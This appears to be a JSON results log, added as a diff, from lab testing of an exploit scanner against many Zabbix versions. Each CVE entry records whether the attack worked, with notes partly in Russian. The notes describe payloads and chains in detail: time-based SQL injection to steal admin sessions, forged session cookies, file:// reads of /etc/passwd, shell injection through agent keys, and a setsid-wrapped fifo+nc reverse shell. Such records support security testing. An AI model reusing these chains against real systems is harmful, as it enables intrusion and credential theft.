@@ -1,0 +1,247 @@
+{
+ "CVE-2021-46088": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix (fresh install)",
+   "note": "script.create+execute on server container: uid=1997(zabbix). Live docker image zabbix-server-pgsql:5.4.8-alpine."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds; three execution modes",
+   "note": "--cmd one-shot, --shell persistent (2 commands through session), --revshell: interactive bash captured (uid=1997(zabbix), bash-5.1$, uname/hostname). All three modes verified live."
+  }
+ ],
+ "CVE-2025-27233": [
+  {
+   "version": "7.0.10-alpine agent2",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "own agent2 container, wrapper around smartctl logs argv",
+   "note": "Argument injection proven: smart.disk.get[device,mode] lands verbatim in the smartctl argv (-a MARKER -d MARKER) via the verified agent passive protocol ({\"request\":\"passive checks\",\"data\":[{key,timeout}]}). Primitive confirmed live; full ICE impact (NTLMv2/UNC on Windows, RCE flavor on 5.0.x) environment-dependent."
+  }
+ ],
+ "CVE-2025-27234": [
+  {
+   "version": "5.0.46-alpine agent2",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "own live container zlab_agent2_5; raw 5.0 passive protocol (ZBXD\\x01+LE64 raw item key); smart.disk.get[device,mode]",
+   "note": "RCE-флейвор НЕ воспроизведён: параметры проходят cleanRegex ^[a-zA-Z0-9 \\-_/\\\\\\\\.]*$ (clearString, добавлен в 5.0.40, DEV-2701) — все shell-метасимволы (;,|,&,$(),backticks,кавычки,\\n) отклоняются с ZBX_NOTSUPPORTED 'Invalid characters found in parameter'. Код-путь всё ещё shell-бекед (zbxcmd.ExecuteStrict -> exec.Command('sh','-c','sudo -n smartctl <args>'), подтверждено исходниками tag 5.0.46) — RCE возможен только на 5.0.0-5.0.39 без regex; 5.0.47 переписан на exec-массив (controller.go, ZBX-23858). Флаг-инъекция в argv smartctl работает (-V долетает, smartctl версия в выводе)."
+  },
+  {
+   "version": "7.0.10-alpine agent2",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "own live container zlab_agent2; JSON passive checks protocol",
+   "note": "Санитизации НЕТ (параметры verbatim), но вызов через exec-массив (exec.CommandContext('sudo','-n',smartctl,args...), controller.go) — шелла нет, argv-only: флаги (-V, -f, -l scttempsts) доходят до smartctl, исполнения команд нет."
+  },
+  {
+   "version": "5.0.30-alpine agent2",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "pre-whitelist сборка (5.0.0-5.0.39), raw-key passive протокол",
+   "note": "smart.disk.get device/mode -> shell-backed smartctl -> инъекция ';cmd;' исполняется от zabbix (touch-маркеры /tmp/pwn30* созданы). Полный ИНТЕРАКТИВНЫЙ ШЕЛЛ через fifo+nc payload: 'sh: can't access tty; job control turned off; /var/lib/zabbix $ id -> uid=1997(zabbix)'. RCE-флейвор 5.0 подтверждён live."
+  },
+  {
+   "version": "5.0.30-alpine agent2 (zbxscan module)",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "module CVE-2025-27234 (agent2.py _session): --agent-port 10061 --revshell 172.18.0.1:<port> --cmd 'id; hostname' и --shell REPL",
+   "note": "Модуль: --cmd/--shell подтверждены live. Payload обёрнут в (setsid sh -c '<fifo+nc chain>' </dev/null >/dev/null 2>&1 &) — переживает плагинный kill (~3s 'Timeout while executing a shell script'): --cmd вернул uid=1997(zabbix) + hostname c54cae9b6230, --shell исполнил id и hostname построчно, exit закрыл сессию. Без setsid старый foreground-вариант отдавал только баннер (sh умирал до прихода команды) — фикс обязателен."
+  }
+ ],
+ "CVE-2013-3628": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "same script-exec technique (shared module, verified through CVE-2021-46088)",
+   "note": "post-auth global-script RCE confirmed on 5.4.8."
+  }
+ ],
+ "CVE-2022-23131": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "SAML enabled (config.saml_auth_enabled=1) + dummy IdP + idp.crt",
+   "note": "Full chain: forged zbx_session (reused anon sessionid/sign + saml_data.username_attribute=Admin) -> index_sso.php -> Admin session (userid=1) -> script.execute RCE uid=1997(zabbix)."
+  },
+  {
+   "version": "5.4.8-alpine",
+   "result": "blocked",
+   "when": "2026-10-28",
+   "conditions": "default docker image, SAML disabled",
+   "note": "Forge yields a session cookie but login block is skipped (saml_auth_enabled=0) -> no identity. Condition check reflects this (unknown until active attempt)."
+  }
+ ],
+ "CVE-2022-23134": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "attacker PostgreSQL on same docker network, schema cloned; DB_TYPE POSTGRESQL, DB_ENCRYPTION=0",
+   "note": "Full takeover verified: forged zbx_session {step:6 + DB_host/port/db/user/pass + POSTGRESQL + encryption off} -> setup.php stage6 -> zabbix.conf.php rewritten to attacker DB -> login Admin/<attacker-known pass> succeeds, original creds fail. Live (zabbix-web-nginx-pgsql:5.4.8-alpine)."
+  }
+ ],
+ "CVE-2016-10134": [
+  {
+   "version": "3.0.3",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "source-built 3.0.3 (debian:jessie, mysql:5.6), guest session auto-login",
+   "note": "Unauthenticated error-based SQLi via jsrpc.php profileIdx2 (mode=1 screen.get, resourcetype=17): payload lands unescaped in INSERT INTO profiles idx2 -> MySQL error echoes value. Extracted ~5fce1b3e34b520afeffb37ce08c7cd666 = MD5('zabbix') = Admin passwd (users.passwd, default Admin/zabbix). Live (self-built zlab-old-zabbix:3.0.3, web 127.0.0.1:18080)."
+  }
+ ],
+ "CVE-2024-42327": [
+  {
+   "version": "6.0.31-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
+   "note": "time-based SQLi via user.get selectRole (pg_sleep oracle, binary search) -> extracted Super Admin sessionid from sessions (userid=1) -> script_rce -> uid=1997(zabbix) on server container. Full chain CVE-2024-42327 -> RCE verified live (zabbix-server-pgsql:6.0.31-alpine)."
+  },
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix; PostgreSQL backend",
+   "note": "Same chain re-verified on 7.0.0: selectRole SQLi -> Super Admin session -> script_rce uid=1997(zabbix). Live (zabbix-server-pgsql:7.0.0-alpine)."
+  }
+ ],
+ "CVE-2020-11800": [
+  {
+   "version": "3.0.30",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "source-built 3.0.30 (debian:jessie, mysql:5.6) + auto-registration action enabled (actions eventsource=2 status=0, operations operationtype=2 'Add host'), trapper 127.0.0.1:18052",
+   "note": "Trapper RCE via auto-registration ip injection: active-checks request with ip='ffff:::;touch${IFS}/tmp/success11800m' (IPv6 is_ip6 parse bug allows the trailing shell) registers host zbxautof5bcef (hostid 10108); brute-forced command scriptid=1 (Ping, /bin/ping -c 3 {HOST.CONN}) executes server-side with the injected ip -> 'ping: unknown host ffff:::' + semicolon command ran. Marker /tmp/success11800m created by uid zabbix in server container (verified twice: hosts 10106/10108, markers success11800+success11800m). Live (zlab-old-zabbix:3.0.30)."
+  }
+ ],
+ "CVE-2025-27232": [
+  {
+   "version": "7.4.2-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Super Admin web session (Admin/zabbix)",
+   "note": "LFI via oauth.authorize: state.token_url=file:///etc/passwd -> curl reads the file -> raw_response in 'Unexpected HTTP response status code' message. Differential probe confirmed (/etc/passwd content, +898 bytes vs bogus path). Live (zabbix-web-nginx-pgsql:7.4.2-alpine)."
+  }
+ ],
+ "CVE-2024-22120": [
+  {
+   "version": "6.0.27-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "default creds Admin/zabbix; trapper 10051 (mapped); PostgreSQL backend",
+   "note": "Blind time-based SQLi via trapper audit clientip verified live E2E -> RCE. Dual-time hex oracle (match: pg_sleep(2) else pg_sleep(0.6), ASCII equality, hex alphabet 0123456789abcdef), cross-checked against W01fh4cker/CVE-2024-22120-RCE and reporter PoC (support#236280) — identical. Extracted config.session_key (pos-1 byte flaked '1' vs 'd'; rest byte-exact to DB) and a real Super Admin sessionid 82ca9c81fb29777ef87471448281aac2 (verified in sessions, userid=1, status=0). script.create (super-admin only) accepted; script.execute returned uid=1997(zabbix) gid=1995(zabbix) on the 6.0.27 server. Full chain trapper SQLi -> admin session -> script RCE proven live. Cookie-forge mechanics (HMAC-SHA256(session_key, compact json)) validated separately; not required for the API-session RCE."
+  }
+ ],
+ "CVE-2024-36465": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "role User account (zbxlow…), PostgreSQL backend",
+   "note": "Time-based SQLi via API groupBy (CApiService): groupBy entry 'userid,(CASE WHEN … THEN pg_sleep ELSE NULL END)' evaluated per row. low user -> extracted Super Admin sessionid from sessions (userid=1) -> script.create probe (super-admin only) -> script_rce -> uid=1997(zabbix). Full chain verified live (7.0.0, no public PoC)."
+  }
+ ],
+ "CVE-2024-36464": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Admin; mediatype Email with passwd set",
+   "note": "Detector verified live: mediatype.get(output extend) returns 'passwd' in cleartext (value_head SecretP@ss12…) — the export/YAML exposure surface confirmed. Module CVE-2024-36464 (leak-detect)."
+  }
+ ],
+ "CVE-2024-36460": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin",
+   "note": "auditlog.get exists on 7.0 and returns records matching 'passwd' (3 rows) — plaintext-password audit exposure surface confirmed. Module CVE-2024-36460 (leak-detect)."
+  }
+ ],
+ "CVE-2024-42325": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin",
+   "note": "user.get returns cross-user login-attempt metadata (guest: attempt_failed=1/attempt_clock) for shared-group members — leak surface confirmed. Module CVE-2024-42325 (leak-detect)."
+  }
+ ],
+ "CVE-2024-36467": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "low user (role User, group Guests) created then abused as attacker",
+   "note": "user.update added the low user to 'Zabbix administrators' (usrgrpid 7) — verified via user.get selectUsrgrps. Privesc chain confirmed live (zabbix-server-pgsql:7.0.0-alpine); 7.0 renamed API to usergroup.get."
+  }
+ ],
+ "CVE-2024-36469": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "default install, bcrypt10 cost",
+   "note": "login timing for existing vs non-existing username within noise (0.26-0.32s); signal not measurable on this lab — condition-only module, may differ on other configs."
+  }
+ ],
+ "CVE-2022-46768": [
+  {
+   "version": "6.0.11-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "web-service container, AllowedIP open, seccomp=unconfined (chrome)",
+   "note": "POST /report {'url':'file:///etc/passwd','parameters':{w,h}} -> 200 application/pdf (%PDF-1.4, Chromium) — arbitrary file read from the web-service host confirmed live (zabbix/zabbix-web-service:6.0.11-alpine)."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "same probe",
+   "note": "400 'Unexpected URL scheme: file' — patched detection verified (fix 6.0.12rc1+)."
+  }
+ ],
+ "CVE-2023-29450": [
+  {
+   "version": "6.0.27-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "Admin, item type 5 internal + JS step type 21",
+   "note": "created internal item with HttpRequest.get('file:///etc/passwd'); lastvalue = boottime value only, no file content — CURLOPT_PROTOCOLS block verified (actual code fix at 6.0.14). Positive repro needs server <6.0.14/5.0.32/6.2.8."
+  }
+ ],
+ "CVE-2024-22116": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "negative",
+   "when": "2026-10-28",
+   "conditions": "Admin, host.update interface DNS",
+   "note": "interface DNS with shell meta-chars rejected by validation ('Incorrect interface DNS parameter') — the fix (7.0.0rc3); vulnerable builds (7.0.0a1-rc2, 6.4.9-6.4.15) accept and execute Ping on server. Positive repro needs a 7.0.0rc2/6.4.15 image (unavailable)."
+  }
+ ],
+ "CVE-2025-27240": [
+  {
+   "version": "7.0.0-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Admin creds; autoregistration action with 'Remove host' operation; host visible name = SQL payload; trapper trigger (active checks, changed host_metadata)",
+   "note": "Secondary-order SQLi live on zlab_7_0_0 (web 47467, trapper 44646, PG). Error: server log '[Z3005] ... invalid input syntax for type integer: \"ZBX27240\" LINE 1: delete from autoreg_host where host='zpx'||CAST('ZBX27240' AS int)||'x''. Time-based: pg_stat_activity showed the escalator session active on 'delete from autoreg_host where host='zpx'||(SELECT pg_sleep(12))||'x'' for the full sleep. Module Cve202527240 (misc.py) ok=True: --sleep 8 -> trigger answered 13.02s (5s baseline + 8s), host removed. vuln code: op_host_del() sprintf's select_discovered_host() h.name into DBexecute('delete from autoreg_host where host='%s'') unescaped; fix 6416019f3117 [DEV-3902] added DBdyn_escape_string (6.0.34/6.4.19/7.0.4)."
+  },
+  {
+   "version": "6.0.27-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "Admin creds; autoreg action 'Remove host'; visible name payload; trapper trigger after ~70s config-cache wait (CacheUpdateFrequency=60)",
+   "note": "Live on zlab_6_0_27 (web 45495, trapper 44645, PG): server log '[Z3005] ... invalid input syntax for type integer: \"ZBX27604B\" [delete from autoreg_host where host='zpx'||CAST('ZBX27604B' AS int)||'x']'. Escalation async on 6.0; host-removal step (DBlock_hostids FOR UPDATE) can be skipped under DB load but the injected DELETE still executes — log/error evidence is the reliable channel, latency oracle is not (unlike 7.0.0). Same vulnerable code path as the fix diff."
+  }
+ ]
+}
